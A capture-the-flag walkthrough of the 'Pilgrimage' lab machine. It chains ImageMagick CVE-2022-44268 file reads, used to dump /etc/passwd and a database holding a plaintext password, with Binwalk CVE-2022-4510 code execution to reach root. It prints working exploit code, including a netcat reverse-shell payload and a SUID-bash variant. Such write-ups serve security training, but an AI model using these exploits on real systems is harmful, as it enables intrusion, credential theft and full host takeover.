# pilgrimage

| Hostname   | Difficulty |
| ---        | ---        |
| pilgrimage |            |

Machine IP: 10.10.11.219 :

```bash
TARGET=10.10.11.219       # pilgrimage IP address
```

## Initial Reconnaissance

### Ports and services

Let's start by enumerate the exposed services :

```shell
nmap -p- $TARGET -T4
```

Result:

```text
Nmap scan report for 10.10.11.219
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Let's enumerate deeper these services :

```shell
nmap -p 22,80 -sC -sV -A $TARGET -T4
```

Result:

```text
Nmap scan report for 10.10.11.219
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```shell
echo "$TARGET   pilgrimage.htb" >> /etc/hosts
```


### Web

![[Pasted image 20230719224003.png]]

```shell
gobuster dir -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://pilgrimage.htb/
```

Result:

```text
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/18 22:54:59 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
```

```shell
gobuster dir -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://pilgrimage.htb/
```

Result:

```text
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/18 23:04:07 Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 6173]
/login.php            (Status: 200) [Size: 6166]
/index.php            (Status: 200) [Size: 7621]
/.htaccess            (Status: 403) [Size: 153]
/logout.php           (Status: 302) [Size: 0] [--> /]
/.                    (Status: 200) [Size: 7621]
/.html                (Status: 403) [Size: 153]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/.htpasswd            (Status: 403) [Size: 153]
/.htm                 (Status: 403) [Size: 153]
/.git                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/]
/.htpasswds           (Status: 403) [Size: 153]
/.htgroup             (Status: 403) [Size: 153]
/.htaccess.bak        (Status: 403) [Size: 153]
/.htuser              (Status: 403) [Size: 153]
/.ht                  (Status: 403) [Size: 153]
/.htc                 (Status: 403) [Size: 153]
Progress: 17063 / 17130 (99.61%)
===============================================================
2023/07/18 23:04:38 Finished
===============================================================
```

There is a `.git` folder. access to this filder result in a 403 error, but we can still read known files inside :

```shell
curl http://pilgrimage.htb/.git/config
```

Result:

```text
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

Freom https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git, we can use a tool named `git-dumper` :

```shell
pip install git-dumper
git-dumper http://pilgrimage.htb ./git-dump/
```

```shell
cd git-dump  
ls
```

Result:

```text
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

We have the web application source code

From `index.php` file, we can get some interesting information

On the welcome page, we can upload a photo or image file :

![[Pasted image 20230719223929.png]]

On upload, the file is uploaded in folder `/var/www/pilgrimage.htb/tmp` :

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
```

Then the image is shrink at 50% of its size :

```php
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
```

Finally, the information is stored in a sqlite database :

```php
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
```

In the git-dumped directory, we have the `magick` executable for imagemagick :

```shell
./magick  -version
```

Result:

```text
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

This version of imagemagick 


## Initial access

### Exploitation

https://github.com/voidz0r/CVE-2022-44268/tree/master

```shell
git clone https://github.com/voidz0r/CVE-2022-44268 
cd CVE-2022-44268
cargo run "/etc/passwd"
```

This produce a file `image.png` that we can upload :

![[Pasted image 20230720193907.png]]

The resulting image is a red box, but we can download it 

```shell
identify -verbose ../64b971183bcab.png 
```

Result:

```text
Image:
  Filename: ../64b971183bcab.png
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: PseudoClass
  Geometry: 100x100+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: Palette
  Base type: Undefined
  Endianness: Undefined
  Depth: 8/1-bit
  Channel depth:
    red: 1-bit
    green: 1-bit
    blue: 1-bit
  Channel statistics:
    Pixels: 10000
    Red:
      min: 255  (1)
      max: 255 (1)
      mean: 255 (1)
      standard deviation: 0 (0)
      kurtosis: 8.192e+51
      skewness: 1e+36
      entropy: 0
    Green:
      min: 0  (0)
      max: 0 (0)
      mean: 0 (0)
      standard deviation: 0 (0)
      kurtosis: -3
      skewness: 0
      entropy: 0
    Blue:
      min: 0  (0)
      max: 0 (0)
      mean: 0 (0)
      standard deviation: 0 (0)
      kurtosis: -3
      skewness: 0
      entropy: 0
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 85 (0.333333)
      standard deviation: 0 (0)
      kurtosis: -1.5001
      skewness: 0.707071
      entropy: 0
  Colors: 1
  Histogram:
    10000: (255,0,0) #FF0000 red
  Colormap entries: 2
  Colormap:
    0: (255,0,0) #FF0000 red
    1: (255,255,255) #FFFFFF white
  Rendering intent: Perceptual
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Background color: srgb(99.6124%,99.6124%,99.6124%)
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 100x100+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2023-07-20T17:39:27+00:00
    date:modify: 2023-07-20T17:39:27+00:00
    date:timestamp: 2023-07-20T17:38:32+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 1
    png:IHDR.bit_depth: 1
    png:IHDR.color-type-orig: 3
    png:IHDR.color_type: 3 (Indexed)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 100, 100
    png:PLTE.number_colors: 2
    png:sRGB: intent=0 (Perceptual Intent)
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2023-07-20T17:38:32Z
    Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

    signature: d02a8da86fec6ef80c209c8437c76cf8fbecb6528cd7ba95ef93eecc52a171c7
  Artifacts:
    filename: ../64b971183bcab.png
    verbose: true
  Tainted: False
  Filesize: 1080B
  Number pixels: 10000
  Pixels per second: 24.2878MB
  User time: 0.000u
  Elapsed time: 0:01.000
  Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
```

And convert the image :

```shell
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6......"))"
```

Let's automate it :

```shell
SOURCE=64b971183bcab.png
wget -q http://pilgrimage.htb/shrunk/${SOURCE} -o result_image.png
identify -verbose result_image.png | grep -E '^[a-z0-9]*$' > tmp_raw
Encoded=$(tr -d '\n' < tmp_raw )
python3 -c "print(bytes.fromhex(\"${Encoded}\"))" | sed 's/\\n/\n/g'
```

Result:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Nice ! we can now try to acces the database :

```shell
cargo run "/var/db/pilgrimage"
```

Upload the resulting image.png, then :

```shell
SOURCE=64b9759a2d27e.png
wget -q http://pilgrimage.htb/shrunk/${SOURCE} -O result_image.png
identify -verbose result_image.png | grep -E '^[a-z0-9]*$' > tmp_raw
Encoded=$(tr -d '\n' < tmp_raw )
python3 -c "print(bytes.fromhex(\"${Encoded}\"))" > pilgrimage.sqlite
```

The result is a sqlite database file ASCII encoded. We can stil extract quickly some information by removing binary characters, and extracting strings:

```shell
cat pilgrimage.sqlite | sed 's/\\x00//g' > pilgrimage2.sqlite
strings pilgrimage2.sqlite
```

Result:

```text
b'SQLite format 3\x10\x01\x01@  <\x05\x04\x04\x01<.K\x91\r\x0f\xf8\x04\x0e\xba\x0fe\x0f\xcd\x0e\xba\x0f8|\x03\x07\x17\x19\x19\x01\x81Stableimagesimages\x04CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+\x04\x06\x17?\x19\x01indexsqlite_autoindex_images_1images\x05f\x01\x07\x17\x17\x17\x01\x81+tableusersusers\x02CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))\x02\x06\x17=\x17\x01indexsqlite_autoindex_users_1users\x03\x08\r\x01\x0f\xe6\x0f\xe6\x18\x01\x03\x17-emilyabigchonkyboi123\n\x01\x0f\xf7\x0f\xf7\x08\x03\x17\temily\r\x10\n\x10'
```

The scema :

```sql
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))
```

Since we have dumped `/etc/passwd` file previously, we already know there is a username `emily`. From "emilyabigchonkyboi123", we can guess the associated password :

emily:abigchonkyboi123

We can use this creadential on SSH :

```shell
ssh emily@pilgrimage.htb
```

password :  abigchonkyboi123


### Maintaining access

## Post-Exploitation

### Host Reconnaissance

In the running processes, we can notice :

```shell
ps -efH
```

Result:

```text
root         660       1  0 03:34 ?        00:00:00   /bin/bash /usr/sbin/malwarescan.sh
root         688     660  0 03:34 ?        00:00:00     /usr/bin/inotifywait -m -e create /var
root         689     660  0 03:34 ?        00:00:00     /bin/bash /usr/sbin/malwarescan.sh
```

Let's examine this script `/usr/sbin/malwarescan.sh` :

```shell
!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

This script read files from `/var/www/pilgrimage.htb/shrunk/` (inotifywait monitor the folder) and this folder is accessible :

```shell
la /var/www/pilgrimage.htb/shrunk/
```

Result:

```text
drwxrwxrwx 2 root root 4096 Jul 21 04:00 .
drwxr-xr-x 7 root root 4096 Jun  8 00:10 ..
```

Then it calls binwalk, that we can identify :

```shell
searchsploit binwalk
```

Result:

```text

------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)             | python/remote/51249.py
------------------------------------------------------------ ---------------------------------
```

Get it :

```shell
searchsploit -m 51249
```

### Privilege Escalation

This script require 3 parameters :

```python
parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input .png file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)
```

And have a payload that activate a reverse shell :

```python
   header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']
```

The payload :

```python
import binwalk.core.plugin
import os
import shutil
class MaliciousExtractor(binwalk.core.plugin.Plugin):
	def init(self):
		if not os.path.exists("/tmp/.binwalk"):
			os.system("nc <ip> <port> -e /bin/bash 2>/dev/null &")
			with open("/tmp/.binwalk", "w") as f:
				f.write("1")
		else:
			os.remove("/tmp/.binwalk")
			os.remove(os.path.abspath(__file__))
			shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))
```

Since we already get access to this host, the "nc" payload is not really usefull, we need a way to get higher privileges. Si Instead, we will create a fake account with:

```shell
chmod +s /bin/bash
```

The final python code :


```python
# Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)
# Exploit Author: Etienne Lacoche
# CVE-ID: CVE-2022-4510
import os
import inspect
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input .png file",default=1)

header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("chmod +s /bin/bash")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']


args = parser.parse_args()

if args.file :
    in_file = open(args.file, "rb")
    data = in_file.read()
    in_file.close()

    with open("/tmp/plugin", "w") as f:
        for line in lines:
            f.write(line)

    with open("/tmp/plugin", "rb") as f:
        content = f.read()

    os.system("rm /tmp/plugin")

    with open("binwalk_exploit.png", "wb") as f:
        f.write(data)
        f.write(header_pfs)
        f.write(content)

    print("")
    print("Done.")
    print("")
```

Since this binary file is the photo we upload, we can grab a photo, upload it, and the payload is activated.

```shell
wget https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Kevin_Mitnick_ex_hacker_y_ahora_famoso_consultor_en_redes_en_Campus_Party_M%C3%A9xico_2010.jpg/290px-Kevin_Mitnick_ex_hacker_y_ahora_famoso_consultor_en_redes_en_Campus_Party_M%C3%A9xico_2010.jpg -O kevin.jpg

python3 ./51249-pilgrimage.py ./kevin.jpg

scp ./binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```

We can now activate the bash UID to get a root shell :

```shell
ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 28  2022 /bin/bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ /bin/bash -p
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bash-5.1# id
uid=1000(emily) gid=1000(emily) euid=0(root) egid=0(root) groups=0(root),1000(emily)
bash-5.1#
```


